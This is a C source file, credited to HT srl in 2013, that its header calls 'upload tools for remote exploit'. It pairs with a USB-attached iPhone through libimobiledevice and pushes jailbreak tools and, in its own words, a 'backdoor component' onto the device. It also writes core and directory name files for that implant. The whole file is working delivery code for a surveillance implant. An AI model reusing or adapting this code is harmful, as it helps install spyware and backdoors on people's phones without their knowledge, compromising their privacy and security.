/*
 * uploadtools.c - upload tools for remote exploit
 *
 * Created by Massimo Chiodini on 12/08/2013
 * Copyright (C) HT srl 2013. All rights reserved
 *
 */

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>

#define KJB_LOCAL_FOLDERNAME  "./res"
#define KJB_REMOTE_FOLDERNAME "kdi"
#define IOS_LOCAL_FOLDERNAME  "./ios"
#define IOS_REMOTE_FOLDERNAME "ios"

typedef struct _Jbresources{
  unsigned char **res_list;
  unsigned char **res_name;
  unsigned int  *res_len;
} Jbresources;

void jb_close_device(afc_client_t afc);

char** jb_list_dir_content(char *dir_name)
{
  DIR * d;
  int i = 0;
  static char *dirlist[256];
  struct stat dirstat;
  
  dirlist[0] = NULL;
  
  if (stat(dir_name, &dirstat) == -1)
    return dirlist;
  
  d = opendir (dir_name);
  
  if (! d)
    return dirlist;
  
  while (1)
  {
    struct dirent * entry;
    
    entry = readdir(d);
    
    if (!entry)
      break;
    
    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".") && strcmp(entry->d_name, "(null)")))
    {
#ifdef WIN32
      char *path = (char*)malloc(256);
#else
      char *path = (char*)malloc(entry->d_namlen+1);
#endif
      
      sprintf(path, "%s", entry->d_name);
      
      dirlist[i++] = path;
    }
    
    if (i >= 256)
    {
      i = 255;
      break;
    }
  }
  
  dirlist[i] = NULL;
  
  closedir(d);
  
  return dirlist;
}

void jb_close_device(afc_client_t afc)
{ 
  if (afc != NULL)
    afc_client_free(afc);
}

afc_client_t jb_open_afc()
{
    idevice_t phone = NULL;
    lockdownd_client_t client = NULL;
    uint16_t port = 0;
    afc_client_t afc = NULL;
    idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;

    do
    {
        ret = idevice_new(&phone, NULL);
        usleep(5000);
    } while (ret == IDEVICE_E_NO_DEVICE);

    if (ret != IDEVICE_E_SUCCESS)
        return NULL;

    do
    {
        ret = lockdownd_client_new_with_handshake(phone, &client, "0o0o0o0");
        sleep(1);
    } while (ret != LOCKDOWN_E_SUCCESS);
    
    if (LOCKDOWN_E_SUCCESS != ret)
    {
        idevice_free(phone);
        return NULL;
    }

    ret = lockdownd_start_service(client, "com.apple.afc", &port);
    
    if ((ret == LOCKDOWN_E_SUCCESS) && port)
        ret = afc_client_new(phone, port, &afc);

    lockdownd_client_free(client);
    idevice_free(phone);

    if (ret != AFC_E_SUCCESS)
        return NULL;

    return afc;
}

idevice_error_t jb_copy_local_file(afc_client_t afc, char *lpath, char *rpath, char* lsrc)
{
  uint64_t handle = 0;
  char srcpath[256];
  char dstpath[256];
  struct stat filestat;
  int filelen = 0, bwrite = 0, bwritten = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  sprintf(srcpath, "%s/%s", lpath, lsrc);
  sprintf(dstpath, "%s/%s", rpath, lsrc);
  
  stat(srcpath, &filestat);
  
  filelen = (int)filestat.st_size;
  
  if (filelen <= 0)
    return  ret;
  
  char *filebuff = (char*)malloc(filelen);
  
#ifdef WIN32
  int fd = open(srcpath, O_RDONLY|O_BINARY, 0);
#else
   int fd = open(srcpath, O_RDONLY, 0);
#endif
  
  if (fd == -1)
    return ret;

  int bread = 0;
  
  while (bread < filelen)
    bread += read(fd, filebuff+bread, (filelen-bread));
  
  if (bread != filelen)
  {
    free(filebuff);
    return ret;
  }
  
  ret = afc_file_open(afc, dstpath, AFC_FOPEN_RW, &handle);
  
  if (ret != AFC_E_SUCCESS)
  {
    free(filebuff);
    return ret;
  }
  
  do
  {
    ret = afc_file_write(afc, handle, filebuff, filelen, (uint32_t*)&bwrite);
    
    if (ret != AFC_E_SUCCESS)
      break;
    
    bwritten += bwrite;
    
  } while (filelen > bwritten);
  
  free(filebuff);
  
  ret = afc_file_close(afc, handle);
  
  return ret;
}

idevice_error_t jb_copy_install_files(char *lpath, char *rpath, char **dir_content)
{
  int i = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = jb_open_afc();

  if (afc == NULL)
    return ret;
  
  do
  {
    ret = jb_copy_local_file(afc, lpath, rpath, dir_content[i]);
    
    free(dir_content[i]);
    
    if (ret != IDEVICE_E_SUCCESS)
      break;
    
  } while (dir_content[++i] != NULL);
  
  jb_close_device(afc);
  
  return ret;
}

idevice_error_t jb_make_remote_directory(char *folder)
{
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = jb_open_afc();
  
  if (afc == NULL)
    return ret;
  
  ret = afc_make_directory(afc, folder);
  
  jb_close_device(afc);
  
  return ret; 
}

idevice_error_t jb_copy_buffer_file(unsigned char *filebuff, int filelen, unsigned char* filename)
{
  uint64_t handle;
  int bwrite = 0, bwritten = 0;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
  afc_client_t afc = jb_open_afc();
  
  char dstpath[256];
  
  sprintf(dstpath, "%s/%s", KJB_REMOTE_FOLDERNAME, filename);
  
  ret = afc_file_open(afc, dstpath, AFC_FOPEN_RW, &handle);
  
  if (ret != AFC_E_SUCCESS)
  {
    jb_close_device(afc);
    return ret;
  }
  
  do
  {
    ret = afc_file_write(afc, handle, (const char*)filebuff, filelen, (uint32_t*)&bwrite);
    
    if (ret != AFC_E_SUCCESS)
      break;
    
    bwritten += bwrite;
  
  } while (filelen > bwritten);
  
  ret = afc_file_close(afc, handle);
  
  jb_close_device(afc);
  
  return ret;
}

char *open_iOSInstall(char *filename)
{
    struct stat info;
    int filelen, len = 0;

    int fd = open(filename, O_RDONLY);

    if(fstat(fd, &info) == -1)
    {
      perror("Error on stat file");
      return NULL;
    }

    filelen = (int)info.st_size;

    char *buffer = (char*)malloc(filelen);
    char *ptr = buffer;

    while(len < filelen)
    {
        int rb = read(fd, ptr, filelen);
        len += rb;
        ptr += rb;
    }

    close(fd);

    return buffer;
}

unsigned char *findName(char *name, char *buffer)
{    
    int i, len = strlen(buffer), namelen = strlen(name);
    char *ptr = buffer;
    char *retPtr = NULL;
    for(i=0; i < len; i++)
    {
    	if (strncmp(ptr, name, namelen) == 0)
    	{
    		retPtr = ptr + namelen + 1;
    		break;
    	}
    	ptr++;
    }

    len -= (retPtr - buffer);
    i = 0;

    if (retPtr != NULL)
    {
    	while(i++ < len)
    	{
    		if (retPtr[i] == 0x0A)
    		{
    			retPtr[i] = 0;
    			break;
    		}
    	}
    }

    return (unsigned char*)retPtr;
}

unsigned char *getIosPathname(char *iosfolder)
{
	char *pathname;
	char localinstallpath[256];

	sprintf(localinstallpath, "%s/install.sh", iosfolder);

	char *buff = open_iOSInstall(localinstallpath);

	if (buff == NULL)
		return NULL;

	unsigned char *dirname  = findName("DIR",  buff);

	if (dirname == NULL)
		return NULL; 

	pathname = (char*)malloc(256);

	sprintf(pathname, "/var/mobile/%s", dirname);

	return (unsigned char*)pathname;
}

unsigned char *getIosCorename(char *iosfolder)
{
	char localinstallpath[256];

	memset(localinstallpath, 0, 256);

	sprintf(localinstallpath, "%s/install.sh", iosfolder);

	char *buff = open_iOSInstall(localinstallpath);

	if (buff == NULL)
		return NULL;

	unsigned char *corename = findName("CORE", buff);

	return corename;
}

int uploadTools(char *localFolder, char *remoteFolder, Jbresources *jbresources)
{
	// upload in /var/mobile/Media/kdi folder all tools for jb
	int retVal = 1;
  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
  
	if (jb_make_remote_directory(remoteFolder) != IDEVICE_E_SUCCESS)
		return 0;

  if (jbresources == NULL)
  {
    char **dir_ent = jb_list_dir_content(localFolder);

    if (dir_ent)
    {
      ret = jb_copy_install_files(localFolder, remoteFolder, dir_ent);
      
      if (ret != IDEVICE_E_SUCCESS)
        return 0;
    }
    else
      return 0;
  }
  else
  {
    int i = 0;
    while (jbresources->res_list[i] != NULL)
    {
      ret = jb_copy_buffer_file(jbresources->res_list[i], jbresources->res_len[i], jbresources->res_name[i]);
      if (ret != IDEVICE_E_SUCCESS)
      {
        retVal = 0;
        break;
      }
      
      i++;
    }
  }
  
  return retVal;
}

int createRemoteFoldersAndTools(Jbresources *jbresources, char *iosfolder)
{
	// upload in /var/mobile/Media/kdi folder all tools for jb
	if (uploadTools(NULL, KJB_REMOTE_FOLDERNAME, jbresources) == 0)
		return 0;

	// upload in /var/mobile/Media/ios folder backdoor component
  if (iosfolder == NULL)
    iosfolder = IOS_LOCAL_FOLDERNAME;
  
	if (uploadTools(iosfolder, IOS_REMOTE_FOLDERNAME, NULL) == 0)
		return 0;

	unsigned char *core = getIosCorename(iosfolder);
	unsigned char *dir  = getIosPathname(iosfolder);

	if (core == NULL || dir == NULL)
		return 0;

	jb_copy_buffer_file(core, strlen((const char*)core), (unsigned char*)"fcore");

	jb_copy_buffer_file(dir,  strlen((const char*)dir),  (unsigned char*)"fdir");

	return 1;
}

int removeKBTools()
{
	
	return 1;
}

int remove_iOsFolder()
{

	return 1;
}